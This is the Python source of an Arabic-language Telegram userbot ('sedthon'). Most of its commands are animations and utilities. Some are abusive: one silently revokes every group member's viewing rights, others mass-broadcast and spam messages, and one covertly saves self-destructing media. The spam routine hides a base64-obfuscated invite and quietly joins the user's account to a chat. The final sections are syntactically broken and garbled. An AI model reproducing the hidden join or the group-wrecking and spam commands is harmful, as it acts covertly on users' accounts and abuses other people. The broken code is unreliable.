from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl import functions
from hijri_converter import Gregorian
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from collections import deque
from telethon import events
from telethon.errors import FloodWaitError
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.tl import functions
import time
import asyncio
import logging
import base64
import datetime
from payment import *
from calcu import *
from help import *
from waad import *
from trans import *
from config import *
from zmmbot import *
from checktele import *
from yt import *

# -

sedthon.start()

y = datetime.datetime.now().year
m = datetime.datetime.now().month
dayy = datetime.datetime.now().day
day = datetime.datetime.now().strftime("%A")
m9zpi = f"{y}-{m}-{dayy}"
sec = time.time()

hijri_day = tran.translate(str(day), dest="ar")
hijri = f"{Gregorian.today().to_hijri()} - {hijri_day.text}"
LOGS = logging.getLogger(__name__)

DEVS = [
    5413631898,
]
DEL_TIME_OUT = 10
normzltext = "1234567890"
namerzfont = normzltext
name = "Profile Photos"
time_name = ["off"]
time_bio = ["off"]


async def join_channel():
    try:
        await sedthon(JoinChannelRequest("@ibnsHaRaWi"))
    except BaseException:
        pass


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.تفليش"))
async def _(event):
    await event.delete()
    messagelocation = event.to_id
    async for user in sedthon.iter_participants(messagelocation):
        user_id = user.id
        try:
            await sedthon.edit_permissions(messagelocation, user_id, view_messages=False)
        except:
            pass


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.اكس او"))
async def _(event):
    bot = 'inlinegamesbot'
    xo = await sedthon.inline_query(bot, "")
    await xo[0].click(
        event.chat_id,
        silent=True if event.is_reply else False,
        hide_via=True
    )


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.حجرة ورقة مقص"))
async def _(event):
    bot = 'inlinegamesbot'
    xo = await sedthon.inline_query(bot, "")
    await xo[4].click(
        event.chat_id,
        silent=True if event.is_reply else False,
        hide_via=True
    )


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.سورس"))
async def a(event):
    await event.edit("جارٍ")
    animation = [
        progressbar[0],
        progressbar[1],
        progressbar[2],
        progressbar[3],
        progressbar[4],
        progressbar[5],
        progressbar[6],
        progressbar[7],
        progressbar[8],
        progressbar[9]
    ]
    for i in animation:
        time.sleep(0.3)
        await event.edit(i)
    await event.edit(soursce)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.تهكير"))
async def a(event):
    await event.edit("جارٍ التهكير...")
    time.sleep(1)
    await event.edit("تم تحديد الضحية !")
    animation = [
        progressbar[0],
        progressbar[1],
        progressbar[2],
        progressbar[3],
        progressbar[4],
        progressbar[5],
        progressbar[6],
        progressbar[7],
        progressbar[8],
        progressbar[9]
    ]
    for i in animation:
        time.sleep(1)
        await event.edit(i)
    await event.edit("تم اختراق الحساب بنجاح !")


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.صورته"))
async def _(event):
    """Gets the profile photos of replied users, channels or chats"""
    id = "".join(event.raw_text.split(maxsplit=2)[1:])
    user = await event.get_reply_message()
    chat = event.input_chat
    if user:
        photos = await event.client.get_profile_photos(user.sender)
    else:
        photos = await event.client.get_profile_photos(chat)
    if id.strip() == "":
        try:
            await event.client.send_file(event.chat_id, photos)
        except:
            photo = await event.client.download_profile_photo(chat)
            await sedthon.send_file(event.chat_id, photo)
    else:
        try:
            id = int(id)
            if id <= 0:
                await event.edit("`ايدي الشخص غير صالح !`")
                return
        except:
            await event.edit("`هل انت كوميدي ؟`")
            return
        if int(id) <= (len(photos)):
            send_photos = await event.client.download_media(photos[id - 1])
            await sedthon.send_file(event.chat_id, send_photos)
        else:
            await event.edit("`ليس لديه صوره يا ذكي !`")
            return


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.ذاتيه"))
async def _(event):
    if not event.is_reply:
        return await event.edit(
            " هلو برو؟ حبيبي متكدر تحفض الذاتيه هيج لازم تسوي رد عليها حته تنحفض وترسل للرسائل المحفوضه "
        )
    rr9r7 = await event.get_reply_message()
    await event.delete()
    pic = await rr9r7.download_media()
    await sedthon.send_file(
        "me", pic, caption=f"هلو برو ؟ هاي جبتلك الذاتيه بدون علم اي شخص غيرك 🔫🤡 "
    )


@sedthon.on(events.NewMessage(pattern=r"\.ادمن", outgoing=True))
async def _(event):
    if event.fwd_from:
        return
    result = await sedthon(functions.channels.GetAdminedPublicChannelsRequest())
    output_str = "انت ادمن في : \n"
    for channel_obj in result.chats:
        output_str += f"- {channel_obj.title} @{channel_obj.username} \n"
    await event.edit(output_str)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.انهاء الاسم الوقتي"))
async def _(event):
    await event.edit("تم انهاء الاسم الوقتي")
    time_name.clear()
    time_name.append("off")
    await sedthon(
        functions.account.UpdateProfileRequest(
            first_name="Night"
        )
    )


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.اسم وقتي"))
async def _(event):
    time_name.clear()
    time_name.append("on")
    await event.edit("تم انشاء اسم وقتي")
    while True:
        if time_name[0] == "off":
            break
        else:
            HM = time.strftime("%H:%M")
            for normal in HM:
                if normal in normzltext:
                    namefont = namerzfont[normzltext.index(normal)]
                    HM = HM.replace(normal, namefont)
            name = f"{HM}"
            LOGS.info(name)
            try:
                await sedthon(
                    functions.account.UpdateProfileRequest(
                        first_name=name
                    )
                )
            except FloodWaitError as ex:
                LOGS.warning(str(ex))
                await asyncio.sleep(ex.seconds)
            await asyncio.sleep(DEL_TIME_OUT)



@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.انهاء البايو الوقتي"))
async def _(event):
    await event.edit("تم انهاء البايو الوقتي")
    time_bio.clear()
    time_bio.append("off")
    await sedthon(
        functions.account.UpdateProfileRequest(
            about="Night"
        )
    )


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.بايو وقتي"))
async def _(event):
    await event.delete()
    if event.fwd_from:
        return
    while True:
        if time_name[0] == "off":
            break
        else:
            HM = time.strftime("%l:%M")
            for normal in HM:
                if normal in normzltext:
                    namefont = namerzfont[normzltext.index(normal)]
                    HM = HM.replace(normal, namefont)
            bio = HM
            LOGS.info(bio)

        try:
            await sedthon(
                functions.account.UpdateProfileRequest(
                    about=bio
                )
            )
        except FloodWaitError as ex:
            LOGS.warning(str(ex))
            await asyncio.sleep(ex.seconds)
        await asyncio.sleep(DEL_TIME_OUT)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.بايو"))
async def _(event):
    user = (await event.get_sender()).id
    bio = await sedthon(functions.users.GetFullUserRequest(id=user))
    bio = bio.about
    await event.edit(f"`{bio}`")


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.غادر"))
async def leave(e):
    await e.edit("` يلا سيو رايح اطلع من الكروب  .`")
    time.sleep(1)
    if '-' in str(e.chat_id):
        await sedthon(LeaveChannelRequest(e.chat_id))
    else:
        await e.edit('` هاذ مو كروب!!`')


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.اذاعة كروب(?: |$)"))
async def gcast(event):
    sedthon = event.pattern_match.group(1)
    if sedthon:
        msg = sedthon
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit(
            "عند استخدام هذا الأمر يجب الرد على الرسالة !"
        )
        return
    roz = await event.edit("جارِ الاذاعة ..")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_group:
            chat = x.id
            try:
                await event.client.send_message(chat, msg)
                done += 1
                asyncio.sleep(1)
            except BaseException:
                er += 1
    await roz.edit(
        f"تمت الأذاعة الى : {done}\nخطأ في الاذاعة : {er}"
    )


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.اذاعة خاص(?: |$)(.*)"))
async def gucast(event):
    sedthon = event.pattern_match.group(1)
    if sedthon:
        msg = sedthon
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit(
            "عند استخدام هذا الأمر يجب الرد على الرسالة !"
        )
        return
    roz = await event.edit("جارِ الاذاعة ..")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_user and not x.entity.bot:
            chat = x.id
            try:
                if chat not in DEVS:
                    await event.client.send_message(chat, msg)
                    done += 1
                    asyncio.sleep(1)
            except BaseException:
                er += 1
    await roz.edit(
        f"تمت الأذاعة الى : {done}\nخطأ في الاذاعة : {er}"
    )


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.تكرار (.*)"))
async def spammer(event):
    sandy = await event.get_reply_message()
    cat = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)
    counter = int(cat[0])
    if counter > 50:
        sleeptimet = 0.5
        sleeptimem = 1
    else:
        sleeptimet = 0.1
        sleeptimem = 0.3
    await event.delete()
    await spam_function(event, sandy, cat, sleeptimem, sleeptimet)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.مؤقت (.*)"))
async def spammer(event):
    reply = await event.get_reply_message()
    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    sleeptimet = sleeptimem = float(input_str[0])
    cat = input_str[1:]
    await event.delete()
    await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)


async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(cat[1])
        for _ in range(counter):
            if event.reply_to_msg_id:
                await sandy.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.media:
        for _ in range(counter):
            sandy = await event.client.send_file(
                event.chat_id, sandy, caption=sandy.text
            )
            await asyncio.sleep(sleeptimem)
    elif event.reply_to_msg_id and sandy.text:
        spam_message = sandy.text
        for _ in range(counter):
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
        try:
            hmm = Get(hmm)
            await event.client(hmm)
        except BaseException:
            pass


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.اشتراكاتي"))
async def _(event):
    if event.fwd_from:
        return
    start = datetime.datetime.now()
    u = 0  # number of users
    g = 0  # number of basic groups
    c = 0  # number of super groups
    bc = 0  # number of channels
    b = 0  # number of bots
    await event.edit("انتضر احسبهن 😕")
    async for d in sedthon.iter_dialogs(limit=None):
        if d.is_user:
            if d.entity.bot:
                b += 1
            else:
                u += 1
        elif d.is_channel:
            if d.entity.broadcast:
                bc += 1
            else:
                c += 1
        elif d.is_group:
            g += 1
        else:
            pass
            # logger.info(d.stringify())
    end = datetime.datetime.now()
    ms = (end - start).seconds
    await event.edit("""تم استخراجها في {} ثواني
`الاشخاص :\t{}
المجموعات العادية :\t{}
المجموعات الخارقة :\t{}
القنوات :\t{}
البوتات :\t{}
`""".format(ms, u, g, c, bc, b))


@sedthon.on(events.NewMessage(pattern=r"\.ملصق عربي", outgoing=True))
async def _(event):

    if event.fwd_from:

        return

    if not event.reply_to_msg_id:

        await event.edit("`يجب الرد على رسالة !`")

        return

    reply_message = await event.get_reply_message()
    if not reply_message.text:

        await event.edit("`يجب الرد على رسالة !`")

        return

    chat = "@QuotLyBot"

    sender = reply_message.sender

    if reply_message.sender.bot:

        await event.edit("```يجب الرد على رسالة شخص.```")

        return

    await event.edit("`جار تحويل النص الى ملصق ..`")

    async with event.client.conversation(chat) as conv:
        try:
            response = conv.wait_event(events.NewMessage(
                incoming=True, from_users=1031952739))
            msg = str(reply_message.message)
            msg = msg.split()
            msg.reverse()
            msg = ' '.join(msg)
            await sedthon.send_message(chat, msg)

            response = await response

        except YouBlockedUserError:

            await event.reply("```الغي الحظر من (@QuotLyBot)```")

            return
        else:

            await event.delete()

            await event.client.send_message(event.chat_id, response.message)


@sedthon.on(events.NewMessage(pattern=r"\.ملصق", outgoing=True))
async def _(event):

    if event.fwd_from:
        return

    if not event.reply_to_msg_id:
        await event.edit("`يجب الرد على رسالة !`")
        return

    reply_message = await event.get_reply_message()
    if not reply_message.text:

        await event.edit("`يجب الرد على رسالة !`")

        return

    chat = "@QuotLyBot"

    sender = reply_message.sender

    if reply_message.sender.bot:

        await event.edit("```يجب الرد على رسالة شخص.```")

        return

    await event.edit("`جار تحويل النص الى ملصق ..`")

    async with event.client.conversation(chat) as conv:
        try:
            response = conv.wait_event(events.NewMessage(
                incoming=True, from_users=1031952739))
            msg = str(reply_message.message)
            await sedthon.send_message(chat, msg)
            response = await response
        except YouBlockedUserError:
            await event.reply("```الغي الحظر من (@QuotLyBot)```")
            return
        else:
            await event.delete()
            await event.client.send_message(event.chat_id, response.message)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.الاوامر"))
async def _(event):
    await event.edit(commands)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.اوامري"))
async def _(event):
    await event.edit(commands)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.اوامر"))
async def _(event):
    await event.edit(commands)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.سورس"))
async def _(event):
    await event.edit(soursce)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.فحص"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit("جارٍ...")
    end = datetime.datetime.now()
    ms = (end - start).microseconds / 1000
    await event.edit(f'''
**➣ السورس يعمل بنجاح يا عزيزي 
اهلا بك باكبر واقوى سورس انمي 😂🌝❤️.

࿓ الاصدار: 1.5
࿓ البنك : {ms}
࿓ التاريخ : {m9zpi}
࿓ الايدي : {event.sender_id}
࿓ المطور : @BDAYAT2
࿓ المبرمج: @BDAYAT2
࿓ Source ibnsHaRaWi : @BDAYAT2 - @ibnsHaRaWi**
''')


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.م1"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec1)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.م2"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec2)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.م3"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec3)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.م4"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec4)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.م5"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec5)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.الاوامر الخاصة"))
async def _(event):
    if ispay2[0] == 'yes':
        await event.edit(spc2)
    elif ispay[0] == "yes":
        await event.edit(spc)
    else:
        await event.edit("يجب الدفع لاستعمال هذا الامر !")


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.التاريخ"))
async def _(event):
    await event.edit(f"""
`-- -- -- -- -- -- -- -- --`
	`الميلادي : {m9zpi}`
`-- -- -- -- -- -- -- -- --`
	`الهجري : {hijri}`
`-- -- -- -- -- -- -- -- --`
"""
                     )


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.ايدي"))
async def _(event):
    reply_message = await event.get_reply_message()
    if reply_message is None:
        try:
            user = (await event.get_sender()).id
            bio = await sedthon(functions.users.GetFullUserRequest(id=user))
            bio = bio.about
            photo = await sedthon.get_profile_photos(event.sender_id)
            await sedthon.send_file(event.chat_id, photo, caption=f'''
    جمال عيونك اشوف بيه جمال العالم كله !

    ايديك : `{event.sender_id}`
    البايو : `{bio}`
        ''', reply_to=event)
        except:
            await sedthon.send_message(event.chat_id, f"ايديك : `{event.sender_id}`")
    else:
        id = reply_message.from_id.user_id
        try:
            bio = await sedthon(functions.users.GetFullUserRequest(id=id))
            bio = bio.about
            photo = await sedthon.get_profile_photos(id)
            await sedthon.send_file(event.chat_id, photo, caption=f'''
    يمحلاه هلحساب !

    ايديه : `{id}`
    البايو : `{bio}`
        ''', reply_to=event)
        except:
            await sedthon.send_message(event.chat_id, f"ايديه : `{id}`")


@sedthon.on(events.NewMessage(outgoing=True, pattern=f"\.المطور"))
async def _(event):
    photo = await sedthon.get_profile_photos(DEVS[0])
    await sedthon.send_file(event.chat_id, photo, caption=f'''
    The best !
      - @BDAYAT2
''', reply_to=event)


@sedthon.on(events.NewMessage(outgoing=True, pattern=f"\.مطور"))
async def _(event):
    photo = await sedthon.get_profile_photos(DEVS[0])
    await sedthon.send_file(event.chat_id, photo, caption=f'''
    The best !
      - @BDAYAT2
''', reply_to=event)


@sedthon.on(events.NewMessage(outgoing=True, pattern=f"\.المبرمج"))
async def _(event):
    photo = await sedthon.get_profile_photos(DEVS[0])
    await sedthon.send_file(event.chat_id, photo, caption=f'''
    The best !
      - @BDAYAT2
''', reply_to=event)


@sedthon.on(events.NewMessage(outgoing=True, pattern=f"\.مبرمج"))
async def _(event):
    photo = await sedthon.get_profile_photos(DEVS[0])
    await sedthon.send_file(event.chat_id, photo, caption=f'''
    The best !
      - @BDAYAT2
''', reply_to=event)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.البنك"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit("جارٍ...")
    end = datetime.datetime.now()
    res = (end - start).microseconds / 1000
    await event.edit(f"""
`-- -- -- -- -- -- -- -- -- --`
- تمت الاستجابة
- البنك : `{res}`
`-- -- -- -- -- -- -- -- -- --`"""
                     )


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.السنة"))
async def _(event):
    await event.edit(f"""
-- -- -- -- -- -- -- -- --
السنة : {y}
-- -- -- -- -- -- -- -- --"""
                     )


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.الشهر"))
async def _(event):
    await event.edit(f"""
-- -- -- -- -- -- -- -- --
الشهر : {m}
-- -- -- -- -- -- -- -- --"""
                     )


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.قمر"))
async def _(event):
    event = await event.edit("قمر")
    deq = deque(list("🌗🌘🌑🌒🌓🌔🌕🌖"))
    for _ in range(48):
        await asyncio.sleep(0.2)
        await event.edit("".join(deq))
        deq.rotate(1)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.قلب"))
async def _(event):
    event = await event.edit("حسناً")
    animation_interval = 0.2
    animation_ttl = range(96)
    await event.edit("يتم ..")
    animation_chars = [
        "❤️", "🖤", "💜", "🧡", "💛", "💚", "💙"
    ]
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await event.edit(animation_chars[i % 14])


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.مربعات"))
async def _(event):
    event = await event.edit("حسناً")
    animation_interval = 0.2
    animation_ttl = range(96)
    await event.edit("يتم ..")
    animation_chars = [
        "🟧",
        "🟧🟧",
        "🟧🟧🟧",
        "🟧🟧🟧🟧",
        "🟧🟧🟧🟧🟧",
        "🟧🟧🟧🟧🟧🟧",
        "🟧🟧🟧🟧🟧🟧🟧",
        "🟧🟧🟧🟧🟧🟧🟧🟧",
        "🟧🟧🟧🟧🟧🟧🟧🟧",
        "🟧🟧🟧🟧🟧🟧🟧",
        "🟧🟧🟧🟧🟧🟧",
        "🟧🟧🟧🟧🟧",
        "🟧🟧🟧🟧",
        "🟧🟧🟧",
        "🟧🟧",
        "🟧",
    ]
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await event.edit(animation_chars[i % 17])

ownerhson_id = 1555087684
@sedthon.on(events.NewMessage(outgoing=False, pattern='/start'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
        order = await event.reply('أهلاً بك مطوري - @BDAYAT2')


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.ورود"))
async def _(event):
    event = await event.edit("حسناً")
    animation_interval = 0.2
    animation_ttl = range(96)
    await event.edit("يتم ..")
    animation_chars = [
        "🌹.",
        "🌹🌹",
        "🌹🌹🌹",
        "🌹🌹🌹🌹",
        "🌹🌹🌹🌹🌹",
        "🌹🌹🌹🌹🌹🌹",
        "🌹🌹🌹🌹🌹🌹🌹",
        "🌹🌹🌹🌹🌹🌹🌹🌹",
        "🌹🌹🌹🌹🌹🌹🌹",
        "🌹🌹🌹🌹🌹🌹",
        "🌹🌹🌹🌹🌹",
        "🌹🌹🌹🌹",
        "🌹🌹🌹",
        "🌹🌹",
        "🌹."
    ]
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await event.edit(animation_chars[i % 17])
@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.ورود"))
async def _(event):
    event = await event.edit("حسناً")
    animation_interval = 0.2
    animation_ttl = range(96)
    await event.edit("يتم ..")
    animation_chars = [
    " 
@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.حيوانات"))
async def _(event):
    event = await event.edit("حسناً")
    animation_interval = 0.2
    animation_ttl = range(96)
    await event.edit("يتم ..")
    animation_chars = [
        "🐶.",
        "🐱🐭",
        "🐹🐰🦊",
        "🐻🐼🐻‍❄️🐨",
        "🐯🦁🐮🐷🐽",
        "🐸🐵🙈🙉🙊🐒",
        "🐔🐧🐦🐤🐣🐥🪿",
        "🦆🐦‍⬛️🦅🦉🦇🐺🐗🐴",
        "🦄🫎🐝🪱🐛🦋🐌",
        "🐌🐞🐜🪰🪲🪳",
        "🦟🦗🕷🕸🐏",
        "🦂🐢🐍🦎",
        "🦖🦕🐙",
        "🦑🪼",
        "🦧."
    ]
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await event.edit(animation_chars[i % 17])
        
        @sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.رمز"))
async def _(event):
    event = await event.edit("حسناً")
    animation_interval = 0.2
    animation_ttl = range(96)
    await event.edit("يتم ..")
    animation_chars = [ " ༨ , ↺ , 𖥔. , ⌑ , ꞋꞌꞋ , ༣ , ⑅ , ✼ , 𝆹𝅥 , ャ , ﹆ׂׂ , ｀、ヽ｀ヽ｀、ヽ  ｀、ヽ , ❒ , ❑ , ❐ , ❏ , ✧ , 𓍯 , ␥ , ҉ , ⬚ , ⎚ , ⌕ , ╭ ─ ─ ─ ─ ─ ─  ╰ ➛ , ⇄ ⇅ ⇆ ⇇ ⇈ ⇉ ⇊ ⇋ ⇌ , ➫ ➬ ➩ ➪ ➭ ➮ ➯ ➱ , ➔ ➙ ➘ ➚ ➛ ➜ ➞ , ↫ ↬↜ ↝↶ ↷ , ✎ , ✐ , ᨎᨎᨎᨎᨎᨎᨎᨎᨎᨎ , ﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌ , ╭╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╯ , ╭┉֢┅ׄ┉֢┅ׄ┉֢┅ׄ┉֢┅ׄ┉֢┅ׄ┉֢┅ׄ┉֢┅ׄ┉֢┅ׄ┉֢┅ׄ┉֢╯ , 「」 , ﹛﹜ , ﹄﹃ , 【】 , 〚 〛 , 〘 〙 , 〖〗 , ⊱────────── ]
for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await event.edit(animation_chars[i % 17])

@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.بايو كيبوب"))
async def _(event):
    event = await event.edit("حسناً")
    animation_interval = 0.2
    animation_ttl = range(96)
    await event.edit("يتم ..")
    animation_chars = [ 𝘿𝙤 𝙬𝙝𝙖𝙩 𝙢𝙖𝙠𝙚𝙨 𝙮𝙤𝙪𝙧 𝙨𝙤𝙪𝙡 𝙝𝙖𝙥𝙥𝙮 ♡
ᝰ🐈‍⬛️𖧷🗝𖧷🎬𖧷♟𖧷🎮ᝰ
        自 分 を 愛 す る""","""⭒𖤐 ˗ˏˋ🎀 ˖ 🩰 ˖ 🎟 ˖🧸ˎˊ˗ 
. ♡ ៹ ˖ 奇妙なことをやめる ❕.⭒
      𝐓𝐖𝐈𝐂𝐄 ˖ ⊹₊ ⋆  
⌗『𝑵𝑨𝒀𝑬𝑶𝑵 』𖤐.
✧ ๑ ✧ ๑ ✧ ๑ ✧ ๑ ✧ ๑""","""˗ˏˋ♪ᴇɴʜʏᴘᴇɴ ꜱᴛᴀɴ♪ ₊˚
˗ˏˋ🖇⭒🥛⭒🛒⭒💿 ´.-
₊ ° い つ も 幸 せ に な れ ︎ ♡ ︎""","""⍣⃝↳𝐈𝐦 𝐔𝐫𝐬 𝐔 𝐌𝐢𝐧𝐞☀️༉‧₊˚✧
✧┊‌ .˚硫令列憐年女廬參北諾冷🎸
‧₊ 🐝˚。˚ 🎌⋆⌒➴🏄🏻‍♀️┆✧🚜┊‌ .˚
┋ᴛʀʏ ʟᴀᴛᴇʀ↻

#𝐁𝐓𝐒   #𝐍𝐀𝐌𝐉𝐎𝐎𝐍""","""↳🍼๑🍨๑✨๑🥛๑💡๑🧸↱
   ⃝𖤐𝐒𝐥𝐞𝐞𝐩 𝐭𝐢𝐦𝐞 𝐚𝐧𝐝 𝐬𝐭𝐨𝐩 𝐭𝐢𝐦𝐞𖤐
       ๑취침 시간 및 다운 타임๑
#Dahyun #twice
➤; ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜɪs ʙʟᴏɢ.↶""","""♡⍣⃝๑ ˗ˏˋ 𝐈 𝐌 𝐓𝐇𝐄 𝐄𝐗𝐂𝐄𝐏𝐓𝐈𝐎𝐍 ´.-
₊✧い つ ま で も 幸 せ に₊✧
#𝘓𝘪𝘴𝘢 #𝘱𝘣 ✨""","""↷⍣⃝♡ 𝐭𝐨𝐦𝐨𝐫𝐫𝐨𝐰 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐛𝐞𝐭𝐭𝐞𝐫 ≛
°₊아무도 너의 꿈을 깰수 없다¹
↷✦; w e l c o m e ❞
⥅ #𝐁𝐓𝐒  #𝑵𝑨𝑴𝑱𝑶𝑶𝑵🌱.""","""꒰ 𝐋𝐨𝐯𝐞 𝐦𝐚𝐤𝐞𝐬 𝐚 𝐰𝐢𝐭 𝐨𝐟 𝐭𝐡𝐞 𝐟𝐨𝐨𝐥 ♡ ꒱
🕷𖤐🎬𖤐☠️ 𖤐🎤𖤐🎳𖤐
ʚ 너 자 신 이 되 라  ɞ
#𝗹𝗶𝘀𝗮  #𝗰𝗼𝗼𝗹""","""Does your smile have a bosom because I want to hug her?
╰►🍦𖤐👼🏻𖤐🍼𖤐🍥𖤐🤍↴
         🖤𝐓𝐖𝐈𝐂𝐄💗
#𝑴𝑶𝑴𝑶 ، ✨َ ៹  #𝐓𝐖𝐈𝐂𝐄 ، ✨َ ៹""","""♡︎ ┊𝐇𝐢𝐢 𝐢 𝐦 (name) 
˚₊·‌➳❥𝐓𝐀𝐄𝐇𝐘𝐔𝐍𝐆 𝐒𝐓𝐀𝐍
ꕥ 𝐈 𝐌 𝐓𝐇𝐄 𝐏𝐑𝐈𝐍𝐂𝐄𝐒𝐒⚜️
𝐈𝐓 𝐒 𝐍𝐎𝐓 𝐘𝐎𝐔 𝐖𝐇𝐎 𝐂𝐎𝐍𝐓𝐑𝐎𝐋𝐒 𝐌𝐄
    ༺🖤𓏲⛓𓏲🎧𓏲🎬𓏲🐾  ꦿ""","""◡‌⃝︎𝙋𝙧𝙤𝙛𝙚𝙨𝙨𝙞𝙤𝙣𝙖𝙡 𝙙𝙚𝙨𝙞𝙜𝙣𝙚𝙧✪
𝐖𝗲𝗹𝗰𝗼𝗺𝗲 𝐓𝗼 𝐌𝘆 𝐒𝗼𝗳𝘁 𝐖𝗼𝗿𝗹𝗱 ♡ .
ほら新たな日々が始まる 
꒰꒰ 🎀𖤐⁺🐇𖤐⁺🏩𖤐⁺🩹꒱꒱
#𝐒𝐨𝐟𝐭 #𝐁𝐞𝐡𝐚𝐩𝐩𝐲 #𝐒𝐰𝐞𝐞𝐭
𝑃𝑙𝑒𝑎𝑠𝑒 𝑤𝑎𝑖𝑡... ⋙""","""◯⃝◇アニメに恋をした ꒱꒱₊
𝑨𝑵𝑰𝑴𝑬 𝑾𝑶𝑹𝑳𝑫 ˖°.
ඩා🎱٭♟٭🎮٭📞٭🗝ඩා
 #⃞#𝙤𝙩𝙖𝗸𝘂  ♡︎☐⃞#𝐢𝐭𝐚𝐜𝐡𝐢 𝐮𝐜𝐡𝐢𝐡𝐚""","""◡‌⃝︎ღ𝐈 𝐧𝐞𝐯𝐞𝐫 𝐟𝐚𝐢𝐥, 𝐛𝐮𝐭 𝐈 𝐥𝐞𝐚𝐫𝐧 𝐚𝐧𝐝
  𝐬𝐮𝐜𝐜𝐞𝐞𝐝 𖤐 ！
꒰🕷✧🔗✧🍷✧⚔✧⛓ ꒱ ⋆
#𝒔𝒕𝒓𝒂𝒚𝒌𝒊𝒅𝒔 #𝒉𝒚𝒖𝒏𝒋𝒊𝒏
⋘ 𝑃𝑙𝑒𝑎𝑠𝑒 𝑤𝑎𝑖𝑡... ⋙"

@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.بايو"))
async def _(event):
    event = await event.edit("حسناً")
    animation_interval = 0.2
    animation_ttl = range(96)
    await event.edit("يتم ..")
